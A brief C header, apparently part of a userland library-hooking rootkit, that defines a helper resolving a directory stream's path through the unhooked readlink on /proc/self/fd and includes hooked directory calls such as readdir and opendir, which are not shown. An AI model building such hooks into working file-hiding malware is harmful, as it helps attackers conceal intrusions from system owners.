#ifndef DIR_H
#define DIR_H

char *gdirname(DIR *dirp)
{
    HOOK(o_readlink, CREADLINK);
    int fd;
    char fd_path[256], *filename=(char *)malloc(256);

    memset(filename, 0, 256);
    fd=dirfd(dirp);
    snprintf(fd_path, 255, "/proc/self/fd/%d", fd);
    if(o_readlink(fd_path, filename, 255) < 0) return NULL;
    return filename;
}

#include "mkdir.c"
#include "rmdir.c"
#include "chdir.c"
#include "readdir.c"
#include "opendir.c"
#endif
